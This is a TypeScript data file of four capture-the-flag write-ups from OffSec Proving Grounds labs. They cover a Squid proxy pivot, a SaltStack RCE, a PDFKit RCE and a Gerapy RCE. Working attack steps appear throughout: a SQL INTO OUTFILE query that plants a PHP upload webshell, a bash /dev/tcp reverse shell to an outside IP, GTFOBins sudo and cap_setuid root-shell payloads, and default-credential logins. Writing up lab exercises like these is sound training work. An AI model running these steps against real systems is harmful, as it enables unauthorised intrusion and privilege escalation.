export type WriteupSection =
  | { type: 'text'; content: string }
  | { type: 'code'; content: string; lang?: string }
  | { type: 'image'; src: string; caption?: string }
  | { type: 'heading'; content: string }
  | { type: 'note'; content: string }
  | { type: 'list'; items: string[] }

export type Writeup = {
  slug: string
  title: string
  platform: string
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Insane'
  os: 'Linux' | 'Windows'
  date: string
  color: string
  tags: string[]
  summary: string
  sections: WriteupSection[]
}

export const writeups: Writeup[] = [
  {
    slug: 'squid',
    title: 'Squid – Proving Grounds',
    platform: 'OffSec Proving Grounds',
    difficulty: 'Easy',
    os: 'Windows',
    date: 'May 2025',
    color: 'lavender',
    tags: ['Windows', 'Squid Proxy', 'phpMyAdmin', 'SeImpersonatePrivilege', 'PrintSpoofer', 'OSCP Prep'],
    summary: 'Abused a misconfigured Squid proxy to reach an internal WampServer, used phpMyAdmin with default creds to drop a PHP webshell, then escalated from LOCAL SERVICE to SYSTEM via FullPowers and PrintSpoofer.',
    sections: [
      { type: 'heading', content: 'Enumeration' },
      { type: 'text', content: 'Nmap revealed one interesting port: port 3128 running Squid 4.14 proxy.' },
      { type: 'text', content: 'Checked for known exploits against this version — none found. Since Squid is a proxy server, I wanted to see what internal and external resources I could reach through it using curl with the -x flag to specify the proxy:' },
      { type: 'code', lang: 'bash', content: 'curl -x http://192.168.102.189:3128 <url>' },
      { type: 'list', items: [
        'curl -x http://192.168.102.189:3128 http://example.com',
        'curl -x http://192.168.102.189:3128 http://127.0.0.1',
        'curl -x http://192.168.102.189:3128 http://localhost',
        'curl -x http://192.168.102.189:3128 http://192.168.102.189:80',
        'curl -x http://192.168.102.189:3128 http://192.168.102.189:443',
        'curl -x http://192.168.102.189:3128 http://192.168.102.189:8080',
      ]},
      { type: 'text', content: 'DNS resolution through the proxy did not work. But accessing http://192.168.102.189:8080 succeeded, revealing an internal WampServer.' },
      { type: 'note', content: 'You can also use https://github.com/aancw/spose to automate internal port scanning through Squid.' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-48.png', caption: 'Internal web server discovered via Squid proxy' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-49.png', caption: 'WampServer dashboard' },
      { type: 'text', content: 'By configuring my browser to use the Squid proxy, I could browse the target\'s internal web server. WampServer details revealed: Apache 2.4.46, PHP 7.3.21, MySQL 5.7.31, MariaDB 10.4.33.' },

      { type: 'heading', content: 'Initial Access via phpMyAdmin' },
      { type: 'text', content: 'A phpMyAdmin login page was accessible through the proxy.' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-50.png', caption: 'phpMyAdmin login page' },
      { type: 'text', content: 'Logged in with credentials root with an empty password — success.' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-51.png', caption: 'phpMyAdmin dashboard after login' },
      { type: 'text', content: 'Used a known technique to write a PHP file uploader to the web root via SQL INTO OUTFILE:' },
      { type: 'code', lang: 'sql', content: `SELECT 
"<?php echo '<form action=\\"\\" method=\\"post\\" enctype=\\"multipart/form-data\\" name=\\"uploader\\" id=\\"uploader\\">';
echo '<input type=\\"file\\" name=\\"file\\" size=\\"50\\"><input name=\\"_upl\\" type=\\"submit\\" id=\\"_upl\\" value=\\"Upload\\"></form>'; 
if( $_POST['_upl'] == \\"Upload\\" ) { 
  if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Done.<b><br><br>'; }
  else { echo '<b>Upload Failed.</b><br><br>'; }
}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';` },
      { type: 'text', content: 'This created a simple file upload form at uploader.php. Navigating to it and uploading a reverse shell gave a shell running as NT AUTHORITY\\LOCAL SERVICE.' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-58.png', caption: 'uploader.php created successfully' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-53.png', caption: 'Shell as NT AUTHORITY\\LOCAL SERVICE' },

      { type: 'heading', content: 'Privilege Escalation to SYSTEM' },
      { type: 'text', content: 'Checking privileges showed that SeImpersonatePrivilege was missing — common for LOCAL SERVICE accounts. Used FullPowers to restore missing privileges by creating a scheduled task that spawns a new process.' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-54.png', caption: 'FullPowers restoring SeImpersonatePrivilege' },
      { type: 'note', content: 'FullPowers: https://github.com/itm4n/FullPowers — creates a scheduled task to recover privileges stripped from service accounts.' },
      { type: 'text', content: 'With SeImpersonatePrivilege restored, used PrintSpoofer to escalate to SYSTEM:' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-55.png', caption: 'PrintSpoofer escalation to SYSTEM' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-56.png', caption: 'proof.txt retrieved from Administrator directory' },
    ],
  },

  {
    slug: 'twiggy',
    title: 'Twiggy – Proving Grounds',
    platform: 'OffSec Proving Grounds',
    difficulty: 'Easy',
    os: 'Linux',
    date: 'May 2025',
    color: 'mint',
    tags: ['Linux', 'SaltStack', 'RCE', 'CVE', 'OSCP Prep'],
    summary: 'Identified SaltStack API v3000.1 via response headers and exploited a known unauthenticated RCE to land a root shell directly — no privilege escalation required.',
    sections: [
      { type: 'heading', content: 'Enumeration' },
      { type: 'text', content: 'Nmap scan revealed ports 80 and 8000 running web servers. Port 8000 appeared to be an API.' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-36.png', caption: 'Port 8000 API response' },
      { type: 'text', content: 'The response header revealed it was a SaltStack API running version 3000.1.' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-31.png', caption: 'SaltStack version 3000.1 identified in response header' },

      { type: 'heading', content: 'Exploitation' },
      { type: 'text', content: 'SaltStack 3000.1 has a known unauthenticated RCE exploit available. To confirm it was working, I first used it to read /etc/passwd:' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-33.png', caption: '/etc/passwd read via RCE — exploit confirmed working' },
      { type: 'text', content: 'The exploit worked and returned the root key. Used it again to read proof.txt directly from the /root directory:' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-35.png', caption: 'proof.txt retrieved as root' },
      { type: 'text', content: 'Also used the exploit to get an interactive root shell via a bash reverse shell:' },
      { type: 'code', lang: 'bash', content: '/bin/bash -i >& /dev/tcp/192.168.45.207/80 0>&1' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-37.png', caption: 'Reverse shell caught as root' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-38.png', caption: 'Root shell confirmed' },
    ],
  },

  {
    slug: 'rubydome',
    title: 'RubyDome – Proving Grounds',
    platform: 'OffSec Proving Grounds',
    difficulty: 'Easy',
    os: 'Linux',
    date: 'May 2025',
    color: 'pink',
    tags: ['Linux', 'PDFKit', 'RCE', 'sudo', 'GTFOBins', 'Ruby'],
    summary: 'PDFKit version leaked in verbose error output. Exploited known RCE to get a shell as "andrew", then abused passwordless sudo over a Ruby script via GTFOBins to escalate to root.',
    sections: [
      { type: 'heading', content: 'Enumeration' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-19.png', caption: 'Nmap results — port 3000 open' },
      { type: 'text', content: 'Port 3000 was running a PDF conversion web application. Providing a link to a non-HTML file returned a verbose error which leaked the PDFKit version in use.' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-27.png', caption: 'Verbose error leaking PDFKit version' },

      { type: 'heading', content: 'Initial Access — PDFKit RCE' },
      { type: 'text', content: 'Although the known exploit targeted a slightly different version, it was worth trying anyway. The exploit worked and gave a shell as user "andrew".' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-21.png', caption: 'Shell obtained as user andrew' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-23.png', caption: 'local.txt retrieved' },

      { type: 'heading', content: 'Privilege Escalation — sudo + GTFOBins' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-24.png', caption: 'sudo -l output showing passwordless Ruby execution' },
      { type: 'text', content: 'Andrew could run /usr/bin/ruby /home/andrew/app/app.rb with sudo and no password. GTFOBins has a Ruby sudo payload — appended exec "/bin/sh" to the end of app.rb, then ran it with sudo to spawn a root shell.' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-29.png', caption: 'GTFOBins Ruby sudo payload' },
      { type: 'note', content: 'Reference: https://gtfobins.github.io/gtfobins/ruby/' },
      { type: 'code', lang: 'bash', content: 'echo \'exec "/bin/sh"\' >> /home/andrew/app/app.rb\nsudo /usr/bin/ruby /home/andrew/app/app.rb' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-25.png', caption: 'Payload appended to app.rb' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-26.png', caption: 'Root shell obtained' },
    ],
  },

  {
    slug: 'levram',
    title: 'Levram – Proving Grounds',
    platform: 'OffSec Proving Grounds',
    difficulty: 'Easy',
    os: 'Linux',
    date: 'May 2025',
    color: 'peach',
    tags: ['Linux', 'Gerapy', 'RCE', 'cap_setuid', 'Python', 'GTFOBins'],
    summary: 'Gerapy 0.9.7 with default creds. Authenticated RCE required creating a dummy project first. Escalated via Python binary with cap_setuid capability using a GTFOBins payload.',
    sections: [
      { type: 'heading', content: 'Enumeration' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-4.png', caption: 'Nmap results — port 8000 open' },
      { type: 'text', content: 'Port 8000 was serving a Gerapy login page.' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-18.png', caption: 'Gerapy login page' },
      { type: 'text', content: 'Default credentials admin:admin worked. Nothing notable on the application itself, but the version was visible: Gerapy 0.9.7.' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-8.png', caption: 'Logged in with admin:admin' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-9.png', caption: 'Gerapy 0.9.7 — authenticated RCE exploit available' },

      { type: 'heading', content: 'Initial Access — Gerapy RCE' },
      { type: 'text', content: 'Running the exploit failed initially — it could not find any projects on the application.' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-17.png', caption: 'Exploit failing due to no projects' },
      { type: 'text', content: 'Created a dummy project directly on the application to satisfy the exploit\'s requirements.' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-11.png', caption: 'Dummy project created on Gerapy' },
      { type: 'text', content: 'Re-running the exploit after creating a project opened a shell as the "app" user.' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-12.png', caption: 'Shell obtained as app user' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-10.png', caption: 'local.txt retrieved' },

      { type: 'heading', content: 'Privilege Escalation — cap_setuid' },
      { type: 'text', content: 'Checked for capabilities on binaries:' },
      { type: 'code', lang: 'bash', content: '/usr/sbin/getcap -r / 2>/dev/null' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-13.png', caption: 'Python binary has cap_setuid capability' },
      { type: 'text', content: 'The Python binary had cap_setuid — allows changing the UID of the running process. GTFOBins has a payload for this. Added os.setuid(0) to set the UID to root before spawning the shell:' },
      { type: 'code', lang: 'bash', content: "/usr/bin/python3.10 -c 'import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-p\")'" },
      { type: 'note', content: 'Reference: https://gtfobins.github.io/gtfobins/python/' },
      { type: 'image', src: 'https://test69987.wordpress.com/wp-content/uploads/2025/05/image-16.png', caption: 'Root shell via cap_setuid Python payload' },
    ],
  },
]
